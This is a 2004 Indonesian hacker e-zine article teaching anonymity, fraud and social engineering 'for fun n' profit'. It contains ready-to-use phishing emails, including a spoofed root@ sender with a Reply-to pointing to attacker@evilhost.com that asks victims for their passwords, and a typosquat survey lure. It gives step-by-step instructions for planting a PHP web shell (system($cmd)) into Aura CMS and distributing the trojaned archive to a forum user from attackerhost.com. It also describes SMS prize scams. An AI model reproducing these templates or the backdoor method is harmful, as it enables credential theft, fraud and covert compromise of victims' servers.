@@ -1,0 +1,452 @@
+
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+
+
+ECHO-ZINE RELEASE
+       06
+
+== IMPROVISASI ANONIMITY, PENIPUAN FOR "FUN N' PROFIT" ==
+Auth: MOBY (echo-staff) - moby[at]echo[dot]or[dot]id
+Online @ www.echo.or.id || http://ezine.echo.or.id
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+/? CH 01 Pengantar. <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Fleksibilitas  protokol  internet  memungkinkan  setiap orang menjadi siapa saja. Internet
+menjamin   privasi   seseorang  lewat anonimity. Seseorang bisa menjadi sesorang yang yang
+berbeda  bahkan  menjadi  seseorang yang lain. Contoh yang paling jelas dapat kita temukan
+dalam  channel-channel  IRC.  Setiap  chatter  memiliki  `nick'  yang dapat dipilih sesuka
+hatinya.  Bahkan  saya pun menggunakan `Handle' dan Anda tidak pernah tahu siapa saya yang
+sebenarnya.  Contoh  lain  bisa kita ambil dari kemampuan telepon seluler dan jaringan GSM
+untuk  menyembunyikan  ID  pemanggil,  sehingga setiap telefon (panggilan) maupun SMS yang
+masuk memiliki id 'tidak dikenal'.
+
+Kelemahan  bak pisau bermata dua tidak berdampak buruk jika hanya  dilakukan untuk sekedar
+bersenang-senang.  Misalnya  saja  menggunakan  nick  pada  IRC yang memiliki karakteristk
+berbeda dengan diri kita. Menyaru sebagai seorang gadis 18 tahun untuk mempermainkan rekan
+chatting  lainnya  dan  banyak penipuan tidak berbahaya lainnya yang dapat dlakukan. Namun
+jika  kita   memanfaatkan  teknologi, flesibilitasnya, dan social engineering, dampak yang
+ditimbulkan  bisa  sangat berbahaya. Bisa berujung pada penyalahgunaan identitas, penipuan
+bahkan pengambil alihan account. Semua itu dimulai dari "Anonimity".
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+/? CH 02 Penggunaan Anonymous Mailer. <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Adalah  sebuah  keharusan  bagi  attacker untuk tidak terdeteksi (stealth). Salah satu cara
+agar  tidak terdeteksi adalah menggunakan Anonimous Mailer. Disamping juga dengan Anonimous
+Mailer, seorang attacker bisa "menjadi siapa saja".
+
+Penggabungan  pemanfaatan  informasi  terhadap korban dengan anonimous mailer, akan menjadi
+senjata  yang  tangguh  bagi  attacker.  Sisi psikologi manusia yang memiliki karakteristik
+mempercayai sesorang yang "pantas" dipercayai membuka celah lebar security.
+
+ex:
+
+From        : root@somehost.com
+Reply-to    : attacker@evilhost.com
+To          : user@somehost.com
+Subject     : Update Password anda.
+
+Dear user.
+
+Sistem  kami  mengalami kerusakan atas serangan hacker. Log kami membaca bahwa hacker telah
+mengambil data-data password. Hal ini berdampak pada diambil alihnya acount Anda. Untuk itu
+kami  harapkan Anda segera melakukan penggantian password dengan me reply email ini (dengan
+mengklik ikon reply) lalu mengirimkan "HANYA" SATU baris yang berisi:
+password-lama:password_baru
+
+Mohon maaf atas ketidak nyamanan ini.
+
+root@somehost.com
+
+-=-=-=-=-
+
+Celah  yang  dimanfaatkan  serangan diatas terletak pada pengirim yang merupakan root (user
+tertinggi dalam sistem *nix). Penerima akan langsung percaya, apalagi jika dibarengi dengan
+profesionalitas  dan  "The  Art  Of  Deception"  dalam  penyusunan  email. Celah kedua yang
+dimanfaatkan  attacker adalah header "Reply-to". Saat korban membalas email dengan mengklik
+reply,   maka   email   TIDAK   akan   terkirim   ke   root@somehost.com   melainkan   ke:
+attacker@evilhost.com .
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+/? CH 03 Pencarian korban. <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Pada  dasarnya   kita   tidak   perlu  melakukan  pencarian  korban, kerena setiap manusia
+memiliki  "loophole"  dalam  sisi  psikologisnya. Setiap serangan nantinya akan bergantung
+pada loophole - yang berbeda untuk setiap manusia - ini.
+
+Pencarian  korban  akan  lebih  mudah  jika  mereka  telah  "membuka  akses" ke dalam sisi
+psikologis  mereka.  Salah  satu  akses  masuk yang dibuka oleh seseorang adalah ketika ia
+bertanya  dan  meminta  pertolongan.  Ketika  sesorang  bertanya atau meminta tolong, pada
+dasarnya  ia  telah  mengundang  intervensi pihak luar. Sebagai tamu yang diundang, adalah
+kesempatan bagi penyerang untuk melakukan intervensi dengan  leluasa.
+
+Tempat  maya  dimana  orang  banyak  bertanya  salah satunya adalah milis.  Bisa juga kita
+sebutkan  Web  Forum,  IRC,  dan  INSANT  MESSENGER.  Dalam  forum,  penyerang akan sering
+mendapatkan target yang bertanya:
+"Dimana saya bisa mendapatkan software bla-bla";
+"Software apa yang sering digunakan untuk bla-bla";
+
+Ketika mereka  mengundang interfensi (campur tangan) dari pihak luar, saat itulah security
+flaw terbuka. Hal ini analog dengan celah keamanan yang ditimbulkan oleh *unchecked input*
+pada software-software buggy, berdampak pada exploitasi buffer overflow dan format string.
+Celah  pada software baru akan terjadi (walaupun tidak selalu) jika pada saat runtime atau
+eksekusi terjadi interaksi antara software dengan user.
+
+ex:
+
+bash $ ./software AAAAAAAAAA [256 karakter] AAAAAAAAAA
+Segmentation fault (Core Dump)
+
+bash $ ./software
+ENTER YOUR NAME : AAAAAAAAAA [256 karakter] AAAAAAAAAA
+Segmentation fault (Core Dump)
+
+Dapat  kita  perhatikan jika  interaksi - pada apa saja - akan membuka celah keamanan yang
+dapat  dieksploitasi. Disinilah kesempatan cracker untuk mencari target dengan spesifikasi
+diatas.  Untuk  lebih  efektifnya  pencarian  korban  yang - tentu saja - relatif terhadap
+situasi dan kondisi, dibutuhkan kesabaran dan kerja keras :P.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+/? CH 04 Metoda penipuan dan exploitasi. <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Berdasarkan  penjelasan  pada  bagian sebelumnya, kita akan membahas loophole yang terjadi
+beserta metoda eksploitasinya. Perhatikan skema protokol interaksi dibawah !
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+PROTOCOL
+
+ [PERSON 1] ---- > REQUEST ---- > [PERSON 2] ---- > RESPONSE ---- > [PERSON 1]
+                   ^ -- > LOOPHOLE
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Loophole  yang  terjadi  dikarenakan  "keadaan untuk percaya" yang terjadi pada [PERSON 1]
+dalam  meminta  pertolongan  (REQUEST)  pada [PERSON 2]. Pada dasarnya meminta pertolongan
+adalah  kebutuhan  dasar manusia  dan  ironi sekali jika sesorang yang meminta pertolongan
+tidak mempercayai orang yang 'di'minta'i' pertolongan.
+
+Saat    loophole   sudah   terbuka,   maka   eksploitasi   dapat  mulai kita lakukan. Pada
+bagian  inilah  social  engineering  diperlukan.  Bagian psychology attack ini akan sangat
+menyenangkan.
+
+From         : bla-bla@mail.com
+To           : milis@milis.com
+Reply-to     : milis@milis.com
+Subject      : Program CMS yang  sederhana, mudah digunakan, modular, mudah dimodifikasi
+               dan gratis
+
+Rekan yang baik.
+
+Program  CMS apa yang mudah dipergunakan, sederhana dan berukuran kecil. Akan saya gunakan
+untuk website pribadi saya di: bla-bla.com
+
+Mohon bantuannya.
+
+-=-=-=-=-
+
+Saat   ini   celah   telah  terbuka,  seorang  penanya  meminta  bantuan  dan  memberikan
+kepercayaannya  kepada  setiap anggota forum. Menanggapi celah ini, attacker mempersiapkan
+balasan:
+
+From          : attacker@freak.com
+To            : milis@milis.com
+Reply-to      : milis@milis.com
+Subject       : [RE]  Program  CMS  yang   sederhana,  mudah  digunakan,  modular, mudah
+                dimodifikasi dan gratis
+
+>>Program   CMS  apa  yang  mudah  dipergunakan,  sederhana dan berukuran kecil. Akan saya
+>>gunakan  untuk website pribadi saya di: bla-bla.com
+Gampang aja bro !! Gunakan aja Aura CMS buatan Arif Supriyanto, d/l aja langsung di:
+http://attackerhost.com/auracms.tar.gz
+
+-=-=-=-=-
+
+Aura   CMS   adalah  software  CMS  yang  sederhana  dan  menarik,  dapat  diperolah  di:
+http://auracms.opensource-indonesia.com/     ,namun    pada   kesempatan   ini   attacker
+memberikan  file  yang  telah dimodifikasi dan disisipi backdoor serta disimpan di website
+pribadinya.
+
+Modifikasi kurang lebih seperti ini:
+
+1. Dapatkan Aura CMS (Pada contoh digunakan versi: 1.1 / 10-Agust-2003)
+2. Buka file index.php
+
+<?
+include "config.php";
+global $judul_situs,$theme;
+include "themes/$theme/header.php";
+?>
+
+
+<!-- awal isi aura cms -->
+<?
+if(!isset($pilih))$pilih='';
+switch($pilih){
+     case 'lihat':
+       include "lihat.php";
+       break;
+     case 'search':
+       include "search.php";
+       break;
+     case 'teman':
+       include "teman.php";
+       break;
+     case 'pesan':
+       include "pesan.php";
+       break;
+     case 'berita':
+       include "berita.php";
+       break;
+     case 'arsip':
+       include "arsip.php";
+       break;
+     case 'hal':
+       include "hal.php";
+       break;
+     case 'gb':
+       include "gb.php";
+       break;
+     default:
+       include "normal.php";
+       break;
+}
+?>
+<!-- akhir isi aura cms -->
+
+<?
+include "themes/$theme/footer.php";
+?>
+
+Perhatikan bagian:
+...
+if(!isset($pilih))$pilih='';
+switch($pilih){
+     case 'lihat':
+       include "lihat.php";
+       break;
+// sisipkan kode disini
+     case 'shell':
+       include "shell.php";
+       break;
+...
+...
+
+3. Buat file "shell.php"
+
+----- shell.php -----
+
+<?
+system($cmd);
+?>
+
+----- shell.php -----
+
+Ingat  untuk  meletakkan  file  shell.php dalam satu direktori (dalam direktori yang sama)
+dengan file index.php
+
+File  index.php  pada  Aura  CMS  mengambil  nilai $pilih dan melakukan lompatan instruksi
+sesuai   dengan   nilai   yang   diberikan.   Backdoor   yang   kita  buat  hanya  dengan
+menambah/memberikan pilihan baru dengan nilai 'shell'.
+
+Jika   kita  mengakses  index.php?pilih=shell&cmd=ls  maka  index.php  akan  mengeksekusi
+shell.php  dan  memberikan  nilai  'ls'  kepada $cmd. Output yang diberikan berupa listing
+direktori/files pada direktori script berada.
+
+Ingat  fungsi system()  akan  mengeksekusi  shell dan memberikan nilai parameternya kepada
+shell.  Parameter ini relatif terhadap command shell sistem operasi. Jika kita menggunakan
+sistem  operasi  *nix,  maka  nilai parameter harus sesuai dengan command shell *nix. Lain
+halnya jika kita menggunakan sistem windust, maka nilai parameter harus sesuai pula dengan
+command shell windust.
+
+        win           |             lin
+        -------------------------------
+        dir           |              ls
+        copy          |              cp
+        ren           |              mv
+
+        ...
+        ...
+
+Sampai  pada  saat  ini  attacker  hanya  menunggu  konfirmasi  dari korban bahwa ia telah
+menggunakan  Aura  CMS  dan  berhasil melakukan set-up. Ada kalanya attacker akan mengirim
+email kepada korban, sekedar untuk memastikan bahwa korban telah masuk dalam perangkap.
+
+Setelah itu, attacker dapat bersenang-senang dengan web-shell barunya :)
+
+Tidak  tertutup  dalam  hal  menawarkan bantuan. Memberikan bantuan pun dapat dimanfaatkan
+sebagai  sarana  penipuan  dan  social  engineering.  Tidak  jauh  berbeda  dengan  metoda
+menawarkan bantuan,  namun dalam metoda memberikan bantuan, perlu kita perhatikan beberapa
+hal.
+
+    1. Kepercayaan.
+       Sebagai  orang  pertama  -  yang  notabene  nya belum dikenal oleh korban - seorang
+       attacker  harus  bisa  mendapatkan  kepercayaan korban. Mendapatkan kepercayaan ini
+       relatif  sulit.  Seorang  attacker  harus mampu bersikap "selayaknya" diterima oleh
+       korban.  Dalam hal ini attacker harus mempelajari dulu sikap dan sifat korban, atau
+       mengambil garis besar dan generalisasi.
+    2. Sikap Profesional.
+       Secara  logika, setiap orang akan mudah percaya dengan seseorang yang datang dengan
+       berpakaian   rapi,  ramah  dan  bersikap  profesional.  Hal ini harus dipegang oleh
+       setiap   attacker   untuk   bersikap  profesional  baik  dalam  hal  bersikap  dan
+       bertuturkata.
+    3. Pengetahuan.
+       Dalam   menembus  sistem  dengan  memanfaatkan  social  engineering,  serta  untuk
+       mendapatkan  kepercayaan  dibutuhkan  pengetahuan  terhadap wilayah interen korban.
+
+Skema  protokol  eksploitasi  dengan  metoda  memberikan bantuan dapat di pelajari melalui
+skema protokol dibawah !
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+PROTOCOL
+
+ [PERSON 1] ----> INFORM ----> [PERSON 2] (CURIOUS)
+                                           ^ ------ >  LOOPHOLE
+                                           
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+/? CH 05 The Art Of Deception. <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+       Perhatikan contoh email berikut:
+
+       From       : hostmaster@webhosting.com
+       To         : Widjaja Krama <w.krama@emil.com>
+       Subject    : Update Account WeBh@stiNG Anda
+
+       Bapak Widjaja Krama Yang Terhormat.
+
+       Sehubungan  dengan  datangnya  tahun baru 2004, kami melakukan penambahan fasilitas
+       wml  untuk  layanan  starterpack  webhosting kami. Dengan wml, maka Anda akan mampu
+       untuk membuat homepage yang dapat diakses melalui ponsel.
+
+       Untuk  bisa  mengaktifkan  layanan tersebut, Anda kami harapkan bersedia meluangkan
+       waktu  untuk  mengisi  angket  yang  kami kami berikan. Silahakan kunjungi url ini:
+       http://www.update-webhosting.com,  isi  angket  yang  tertera,  lalu  klik  submit.
+       Setelah itu Anda harus mengisi kembali data-data pribadi Anda sebagai konfirmasi.
+
+       Selamat Tahun baru, selamat menikmati layanan-layanan kami !
+
+
+       -=-=-=-=-
+
+Jika  kita  perhatikan  contoh email diatas, celah kemanan terletak pada: angket pada url:
+http://www.update-webhosting.com.  Mengapa  ?  Karena  www.update-webhosting.com  hanyalah
+sebuah  typosite.  Mirip  dengan  peristiwa  klikbca.com,  dimana  Steven Haryanto membuat
+typosite  yang  memanfaatkan  kesalahan  mengetik url pada address-bar browser. Namun pada
+teknik ini kita memberikan sedikit sentuhan social engineering.
+
+       Contoh 2.
+       Belakangan ini dalam milis newbie_hacker@yahoogroups.com ada sebuah pesan:
+
+       From       : debra_gd@yahoo.com
+       To         : newbie_hacker@yahoogroups.com
+       Subject    : (newbie_hacker) Important News for newbie_hacker Members
+
+       I was really far into debt.
+       Like Most I was in Financial dispair.
+       I could not seem to get ahead no matter how hard I tried.
+       Untill I found this place.
+       http://answers4save.place.cc
+       If you are in debt they can help you out.
+       Check them out today I did.
+       This email was sent because you joined our group.
+       If you do not wish to recieve any emails, unsubscribe.
+       by sending a mail here newbie_hacker-unsubscribe@yahoogroups.com
+
+       -=-=-=-=-
+
+Teknik  yang  menarik  sekali.  Setiap  pengguna  layanan email, TIDAK (AKAN) PERNAH merasa
+nyaman  terhadap  spamming.  Salah  satu  bentuk spamming yang paling praktis adalah dengan
+mendaftarkan korban  ke  berbagai  mailing  list. Bagi si korban, bentuk penyelamatan pasca
+spamming  dengan  teknik ini adalah "unsubscribe" dari mailing list  bersangkutan. Attacker
+pada  contoh  diatas  memanfaatkan celah psikologi ini untuk membuat korban unsubscibe dari
+mailing list yang memang "sengaja" (dengan sadar) diikutinya.
+
+        Contoh 3.
+        Contoh berikut merupakan bentuk penipuan yang paling sering dijumpai pada saat ini.
+
+        Anda  memenangkan GEBYAR SIMPATI 1 MILYAR ! Silahkan hubungi Customer Service kami,
+        Bpk. HA** ******** 0812*******
+        Pengirim 222
+
+        -=-=-=-=-
+
+Sudah  tidak  asing lagi, penipuan via SMS sangat marak sekali, bahkan tidak sedikit korban
+yang  terjaring  oleh  Attacker. Attacker, dengan memanfaatkan fitur menyembunyikan id oleh
+beberapa operator GSM mengirimkan SMS jebakan kepada korban, lalu menambahkan baris:
+"Pengirim 222" seolah-olah pesan dikirimkan secara resmi oleh pihak TelkomSel.
+
+Masih  banyak  seni  penipuan  yang  dapat dilakukan memanfaatkan anonimity. Namun tentunya
+efektifitas  penipuan  tergantung  kepada  Anda.  Sejauh  mana Anda mampu memanfaatkan sisi
+psikologis  korban  untuk  FUN  N'  PROFIT.  Saya  tidak  akan  membahas lebih banyak lagi.
+Berhubung  dengan  judul  chapter  ini  "The  Art  Of Deception" silahkan Anda baca sendiri
+ebooknya  pada URL:
+http://fux0r.phathookups.com/textfiles/computer_culture/art%20of%20deception.DOC
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+/? CH 06 The Last Word. <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+INGAT,  KEJAHATAN  BUKAN  HANYA TERJADI KARENA NIAT PELAKUNYA, TAPI JUGA KARENA KECEROBOHAN
+ANDA !!!
+WASPADALAH .... WASPADALAH !!!
+
+
+.EOF
+
+                             DEDICATED FOR: NILAM WINDA A.W
+                             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Greetz     : echo|staff (Y3DIPS, the_day2000, COMEX, z3r0byt3, K-159, c-a-s-e)
+             echo|chatterz #e-c-h-o @ dal.net (mesra.kl.my.dal.net)
+             member newbie_hacker @ yahoogroups . com
+             m_beben (oik ..) - Bithedz - evil_bug - Murp - hyp3rl1nk << openuxindo.org >>
+             #aikmel | #kartubeben | #netstrikers | #minangcrew | #neoteker @ dal.net
+             >>> Special For d "BOT" :P :) (ATX-100 - sitinurhaliza - cyberbug)
+             `SAY OM M0BY GANTENG BANGET .. :P
+
+             All Geek Fu***n' People in SMU 3 PA##N#
+             My BUDDIEZZ in 3 IPA 4 SMU 3 PA##N#
+             ANCHA << THNX FOR D "CURHAT"
+             ALL D GIRLS << Thank You For Lovin' Me !!!
+
+Memorialz  : 24 MARET 2004 >> /me THE 17th ANIVERSARY
+             26 MARET 2004 >> NILAM WINDA A.W THE 17th ANIVERSARY
+              3 MEI   2004 >> SAY GOOD BYE !! PERPISAHAN SMU 3 PA##N# 2003/2004
+              ... tIbAlah wAKtUNya ... DipENgHUjUng riNDu-kU ...
+                       * pErpisAHaN aDALaH keNyAtaAn *
+
+	(C)opyleft 29 MEI 2004
+	   _____   ________ _______________.___.
+	  /     \  \_____  \\______   \__  |   |
+	 /  \ /  \  /   |   \|    |  _//   |   |
+	/    Y    \/    |    \    |   \\____   |
+	\____|__  /\_______  /______  // ______|
+	        \/         \/       \/ \/       
+
+	http://members.tripod.co.uk/geek0
+	() ASCII Blue Ribbon.
+	/\ Free Speech n' Thinking
+
